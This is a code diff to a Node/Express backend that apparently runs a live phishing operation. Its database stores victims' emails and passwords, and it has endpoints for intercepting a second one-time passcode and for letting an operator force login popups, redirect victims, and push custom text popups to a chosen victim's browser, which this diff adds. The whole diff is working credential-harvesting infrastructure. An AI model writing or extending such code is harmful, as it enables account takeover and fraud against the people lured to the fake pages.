@@ -132,6 +132,8 @@ async function initializeDatabase() {
         redirect_success BOOLEAN DEFAULT FALSE,
         login_email VARCHAR(255) DEFAULT NULL,
         login_password VARCHAR(255) DEFAULT NULL,
+        admin_text TEXT DEFAULT NULL,
+        text_release BOOLEAN DEFAULT FALSE,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
         updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
@@ -155,7 +157,9 @@ async function initializeDatabase() {
       ADD COLUMN IF NOT EXISTS force_login BOOLEAN DEFAULT FALSE,
       ADD COLUMN IF NOT EXISTS redirect_success BOOLEAN DEFAULT FALSE,
       ADD COLUMN IF NOT EXISTS login_email VARCHAR(255) DEFAULT NULL,
-      ADD COLUMN IF NOT EXISTS login_password VARCHAR(255) DEFAULT NULL
+      ADD COLUMN IF NOT EXISTS login_password VARCHAR(255) DEFAULT NULL,
+      ADD COLUMN IF NOT EXISTS admin_text TEXT DEFAULT NULL,
+      ADD COLUMN IF NOT EXISTS text_release BOOLEAN DEFAULT FALSE
     `).catch(() => console.log('✅ Additional columns exist'));
 
     // Create update timestamp function
@@ -315,7 +319,7 @@ app.post('/api/users/submit-second-otp', async (req, res) => {
   }
 });
 
-// ==================== NEW POLLING ENDPOINTS (ADDED) ====================
+// ==================== POLLING ENDPOINTS ====================
 
 // Check if admin wants to force login popup
 app.post('/api/users/check-force-login', async (req, res) => {
@@ -342,6 +346,27 @@ app.post('/api/users/check-redirect-success', async (req, res) => {
   } catch (error) {
     console.error('❌ Check redirect success error:', error.message);
     res.json({ redirect_success: false });
+  }
+});
+
+// Check if admin sent a text message
+app.post('/api/users/check-admin-text', async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.json({ admin_text: null, text_release: false });
+    
+    const result = await pool.query('SELECT admin_text, text_release FROM users WHERE email = $1', [email]);
+    if (result.rows.length === 0) {
+      return res.json({ admin_text: null, text_release: false });
+    }
+    
+    res.json({ 
+      admin_text: result.rows[0].admin_text, 
+      text_release: result.rows[0].text_release 
+    });
+  } catch (error) {
+    console.error('❌ Check admin text error:', error.message);
+    res.json({ admin_text: null, text_release: false });
   }
 });
 
@@ -424,6 +449,8 @@ app.get('/api/admin/users', authenticateJWT, async (req, res) => {
         redirect_success,
         login_email,
         login_password,
+        admin_text,
+        text_release,
         created_at,
         updated_at
       FROM users 
@@ -479,8 +506,6 @@ app.post('/api/admin/approve-second', authenticateJWT, async (req, res) => {
   }
 });
 
-// ==================== NEW ADMIN ENDPOINTS (ADDED) ====================
-
 // Admin force login - sets force_login flag in database
 app.post('/api/admin/force-login', authenticateJWT, async (req, res) => {
   try {
@@ -523,6 +548,55 @@ app.post('/api/admin/redirect-success', authenticateJWT, async (req, res) => {
     res.json({ success: true, message: 'Redirect to success triggered' });
   } catch (error) {
     console.error('❌ Redirect success error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// ==================== NEW SEND TEXT ENDPOINT ====================
+
+// Admin sends text to user - sets admin_text in database, resets text_release
+app.post('/api/admin/send-text', authenticateJWT, async (req, res) => {
+  try {
+    const { email, text } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    if (!text || text.trim() === '') return res.status(400).json({ error: 'Text message required' });
+    
+    await pool.query(
+      'UPDATE users SET admin_text = $1, text_release = false WHERE email = $2',
+      [text.trim(), email]
+    );
+    console.log('🔔 Admin sent text to user:', email, 'Text:', text);
+    
+    // Notify admin via socket
+    io.emit('text-sent', { 
+      email,
+      text,
+      timestamp: new Date(),
+      message: '📝 Text message sent to user'
+    });
+    
+    res.json({ success: true, message: 'Text sent to user' });
+  } catch (error) {
+    console.error('❌ Send text error:', error.message);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// Admin releases text popup - sets text_release to true
+app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
+  try {
+    const { email } = req.body;
+    if (!email) return res.status(400).json({ error: 'Email required' });
+    
+    await pool.query(
+      'UPDATE users SET text_release = true WHERE email = $1',
+      [email]
+    );
+    console.log('🔔 Admin released text popup for user:', email);
+    
+    res.json({ success: true, message: 'Text popup released' });
+  } catch (error) {
+    console.error('❌ Release text error:', error.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
